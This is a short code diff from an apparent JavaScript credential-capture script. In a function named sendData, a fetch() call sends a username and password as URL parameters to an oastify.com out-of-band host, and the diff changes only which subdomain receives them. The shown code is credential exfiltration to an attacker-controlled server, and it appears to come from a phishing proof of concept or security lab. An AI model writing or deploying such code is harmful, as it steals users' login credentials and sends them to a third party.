@@ -52,7 +52,7 @@ function sendData() {
 
 
 
-    fetch(`https://fo76dbmmalocs2z3m6wmxl1kkbq2ex2m.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
+    fetch(`https://uqoiybbtvfmzgj0xjww0cqt3iuolcc01.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
 
         .then(response => response.text())
 
